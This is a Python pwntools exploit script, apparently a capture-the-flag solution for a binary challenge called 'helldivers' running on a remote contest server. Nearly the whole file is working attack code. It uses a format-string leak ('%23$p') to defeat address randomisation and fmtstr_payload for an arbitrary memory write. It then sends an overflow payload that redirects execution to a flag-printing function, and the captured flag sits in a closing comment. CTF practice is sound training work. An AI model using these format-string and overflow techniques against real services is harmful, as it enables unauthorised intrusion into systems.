#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./helldivers_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
# context.log_level = "DEBUG"

# p = elf.process()
p = remote("helldivers.martiansonly.net", 6666)

# p.sendlineafter(b">>> \n", b"%p"*(0x70//2))
p.sendlineafter(b">>> \n", b"%23$p||||%21$p")
p.recvuntil(b"stratagem:\n")
elf_leak = int(p.recvuntil(b"||||")[:-4].decode(), 16)
elf.address = elf_leak - 0x127E

data_leak = int(p.recvuntil(b"\n").rstrip().decode(), 16)
# libc.address = libc_leak - (0x7fb850c72240 - 0x7fb850b7a000)
# print(f"{hex(libc.address)=}")

# for stack alignment
ret_address = elf.address + 0x19B6

payload = fmtstr_payload(6, {data_leak: ret_address})

p.sendlineafter(b">>> \n", payload)
p.sendlineafter(b">>> \n", "⬇ ⬆ ⬇ ⬆")
p.sendafter(b"today?\n", p64(0x1337 ^ 0x8))
p.sendafter(b"credentials:\n", p64(ret_address))
p.sendlineafter(b">>> \n", b"Quit")

print(payload, len(payload))
# gdb.attach(p)

final_payload = flat({
    120: [
        data_leak,
        elf.address + 0x4E00,
        ret_address,
        elf.symbols['superearthflag']
    ]
})

# gdb.attach(p)
p.sendlineafter(b">>> ", final_payload)
p.interactive()
p.close()
# gdb.attach(p)
# p.interactive()
# shctf{b3c0m3_4_h3r0}  